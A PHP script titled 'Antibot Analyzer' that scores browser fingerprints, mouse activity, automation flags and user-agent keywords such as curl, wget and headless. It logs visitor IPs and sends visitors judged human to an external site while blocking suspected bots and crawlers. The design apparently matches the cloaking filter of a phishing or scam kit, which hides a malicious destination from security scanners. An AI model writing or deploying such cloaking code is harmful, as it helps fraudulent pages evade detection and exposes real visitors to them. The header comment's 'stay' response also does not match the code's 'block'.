<?php
/**
 * Antibot Analyzer - Receives tracking data and decides if visitor is human
 * Returns JSON with action: "redirect" (human) or "stay" (bot/suspicious)
 */
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Valid token check
$validToken = 'c62ad2ac4cf562a883c1327a8af9facc';

$input = json_decode(file_get_contents('php://input'), true);
if (!$input || !isset($input['token']) || $input['token'] !== $validToken) {
    echo json_encode(['action' => 'stay']);
    exit;
}

$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) @mkdir($logDir, 0777, true);

// Scoring system - higher = more likely human
$score = 0;
$flags = [];

// 1. Time on page (bots are fast)
$elapsed = intval($input['t_elapsed'] ?? 0);
if ($elapsed > 2000) $score += 15;
if ($elapsed > 5000) $score += 10;
if ($elapsed < 500) { $score -= 30; $flags[] = 'too_fast'; }

// 2. Mouse movement
if (!empty($input['moved'])) $score += 15;
$moveCount = intval($input['moveCount'] ?? 0);
if ($moveCount > 5) $score += 10;
if ($moveCount > 20) $score += 5;
if ($moveCount === 0) { $score -= 10; $flags[] = 'no_mouse'; }

// 3. Clicks / Scroll / Keys
if (!empty($input['clicked'])) $score += 10;
if (!empty($input['scrolled'])) $score += 10;
if (intval($input['keys'] ?? 0) > 0) $score += 5;

// 4. Screen dimensions (bots often have odd values)
$sw = intval($input['sw'] ?? 0);
$sh = intval($input['sh'] ?? 0);
if ($sw > 0 && $sh > 0) $score += 5;
if ($sw === 0 && $sh === 0) { $score -= 20; $flags[] = 'no_screen'; }

// 5. Touch support on mobile
if (!empty($input['touch'])) $score += 5;

// 6. Bot detection flags
if (!empty($input['webdriver'])) { $score -= 50; $flags[] = 'webdriver'; }
if (!empty($input['phantom'])) { $score -= 50; $flags[] = 'phantom'; }
if (!empty($input['nightmare'])) { $score -= 50; $flags[] = 'nightmare'; }
if (!empty($input['selenium'])) { $score -= 50; $flags[] = 'selenium'; }
if (!empty($input['headless'])) { $score -= 40; $flags[] = 'headless'; }

// 7. Canvas fingerprint (bots often fail)
if (!empty($input['canvas']) && strlen($input['canvas']) > 10) $score += 10;
if (empty($input['canvas'])) { $score -= 10; $flags[] = 'no_canvas'; }

// 8. WebGL renderer
if (!empty($input['webgl']) && strlen($input['webgl']) > 5) $score += 10;
if (empty($input['webgl'])) $flags[] = 'no_webgl';

// 9. Platform / cores check
if (!empty($input['plat'])) $score += 5;
$cores = intval($input['cores'] ?? 0);
if ($cores > 0 && $cores <= 32) $score += 5;

// 10. Color depth
$cd = intval($input['cd'] ?? 0);
if ($cd >= 24) $score += 5;

// User agent check
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$botUAs = ['bot', 'crawl', 'spider', 'slurp', 'curl', 'wget', 'python', 'headless', 'phantom'];
foreach ($botUAs as $b) {
    if (stripos($ua, $b) !== false) {
        $score -= 30;
        $flags[] = 'bot_ua:' . $b;
    }
}

// Decision
$isHuman = $score >= 30;
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

// Log
$logEntry = date('Y-m-d H:i:s') . " | IP: {$ip} | Score: {$score} | Human: " . ($isHuman ? 'YES' : 'NO') . " | Flags: " . implode(',', $flags) . " | UA: " . substr($ua, 0, 80) . "\n";
file_put_contents($logDir . '/analyze.log', $logEntry, FILE_APPEND);

if ($isHuman) {
    echo json_encode([
        'action' => 'redirect',
        'target' => 'https://emsaesp.site/'
    ]);
} else {
    // Bot detected - block access
    echo json_encode([
        'action' => 'block',
        'score' => $score
    ]);
}
